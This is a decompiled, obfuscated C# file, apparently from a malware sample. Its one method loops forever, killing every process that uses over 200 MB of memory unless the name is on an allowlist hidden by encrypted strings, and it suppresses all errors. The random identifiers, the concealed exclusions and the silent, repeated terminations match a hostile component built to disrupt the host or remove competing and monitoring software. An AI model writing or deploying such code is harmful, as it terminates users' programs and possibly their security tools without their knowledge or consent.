using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

public static class LnsjXPzikShT
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void tWDdAuebayUkASdwh()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107378794)) && !process.ProcessName.Contains(getString_0(107378785)) && !process.ProcessName.Contains(getString_0(107378744)) && !process.ProcessName.Contains(getString_0(107378735)) && !process.ProcessName.Contains(getString_0(107378754)) && !process.ProcessName.Contains(getString_0(107378709)) && !process.ProcessName.Contains(getString_0(107378728)) && !process.ProcessName.Contains(getString_0(107378683)) && !process.ProcessName.Contains(getString_0(107378670)) && !process.ProcessName.Contains(getString_0(107378689)) && !process.ProcessName.Contains(getString_0(107378636)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static LnsjXPzikShT()
	{
		Strings.CreateGetStringDelegate(typeof(LnsjXPzikShT));
	}
}
